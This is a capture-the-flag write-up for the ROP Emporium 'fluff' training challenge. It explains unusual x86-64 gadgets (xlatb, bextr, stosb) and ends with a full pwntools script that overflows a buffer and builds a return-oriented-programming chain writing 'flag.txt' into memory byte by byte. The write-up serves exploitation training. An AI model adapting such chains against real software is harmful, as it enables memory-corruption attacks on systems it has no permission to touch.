## Fluff
### Writeup
#### General Beginning Remarks/Analysis
Like the attached message in the site description describes, this challenge is indeed a pain. Mainly because the challenges you face are to learn weird assembler instructions, as well as many of small hurdles; making the exploit take much longer to write despite the idea behind the solution being easy.

Whilst the general idea of the challenge is the same as the previous two challenge (being to write a string into memory then call print_file() with that address as an argument), the real challenge is that we don’t have any gadgets along the lines of:

> mov [x] y; ret

To achieve this same effect, we have to be creative with the weird gadgets provided.

#### Weird Gadgets & Other Quirky Knowledge
Since the main challenge is understanding the weird gadgets provided, here is a breakdown of them first.

1. 0x00400628: XLABT; ret

Basically %AL = byte ptr [RBX + AL]. Uses %AL as an index to a table at %RBX, then put whatever byte is stored in that entry back into %AL.

2. 0x0040062a : pop rdx; pop rcx; add rcx, 0x3ef2 (255218); ret

Nothing strange here, just subtract whatever value you want to put into %RCX with 0x3ef2.

3. 0x00400633 : BEXTR RBX, RCX, RDX

Extract the bits from %RCX using args built from %RDX, then store in %RBX. Better breakdown below...
```
start = RDX & 0xff;

length = (RDX >> 8) & 0xff; // bits 8–15

RBX = (RCX >> start) & mask(length);
```

4. 0x00400639: STOSB BYTE [RDI], AL

Copies the data item from %AL and writes a byte into the address at %rdi.

With the above gadgets, we can copy data from any address, and place it into any address. In general the ordering would be 2 → 3 → 1 → 4. The only other gadget we need is a pop rdi; ret (which is available), which would go inbetween 1 and 4. 

The last bit of necessary knowledge needed is how to find the addresses for characters we want to copy. We can do this through using ROPGadget. 

B4NG has a very nice script for this part in their [writeup](https://b4nng.github.io/ropemporium-fluff/).

#### Solving
Using all the above information, we now know that the solution is the same as write4, but we write by copying existing bytes from memory into the space we want. To achieve this we need to repetitively use the 2→3→1→4 chain discussed above, loading the address of the char we would like to copy into rcx, ensuring that we also account not only for the adding of 0x3ef2, but also whatever was in the register beforehand.

### Exploit
```
#! /bin/env python3
from pwn import *; 
print(f"[\033[95m\033[1m*\033[0m] \033[95m\033[1mSTARTING EXPLOIT\033[0m")

context.log_level = "info"
elf = context.binary = ELF("./fluff")
libelf = ELF("./libfluff.so")
p = elf.process()

# Basic addresses
print_file = 0x00400510
w_address = 0x00601028


# Gadgets
xlabt = 0x00400628 # xlabt; ret
pop_rdx_rcx_bextr = 0x0040062A # pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret
stosb = 0x00400639 # stosb byte [rdi], al; ret 
pop_rdi = 0x004006A3 # pop rdi; ret

# Our string with the addresses of which those chars appear
chars = [
    ("f", 0x00000000004006a6),
    ("l", 0x0000000000400405),
    ("a", 0x00000000004005d2),
    ("g", 0x00000000004007a0),
    (".", 0x00000000004006a7),
    ("t", 0x00000000004006ce),
    ("x", 0x00000000004007bc),
    ("t", 0x00000000004006ce),
]

def load_chars():
    payload = b""
    index = 0
    previous_char = 0xb # set to value in eax before ROP chain 

    for char, address in chars:
        rcx = (address - previous_char) - 0x3ef2
        payload += flat(
                pop_rdx_rcx_bextr,
                0xFF00, # RDX
                rcx,
                xlabt,
                pop_rdi,
                w_address + index,
                stosb
        )
        
        previous_char = ord(char) 
        index += 1

    return payload

payload = flat(
    b"A" * 40,
    load_chars(),
    pop_rdi,
    w_address,
    print_file
)

p.recvuntil(b"> ")
p.sendline(payload)
flag = [w for w in p.recvall().split() if w.startswith(b"ROPE{")][0].decode()
print(f"[\033[92m*\033[0m] flag: \033[105m\033[97m{flag}\033[0m")
```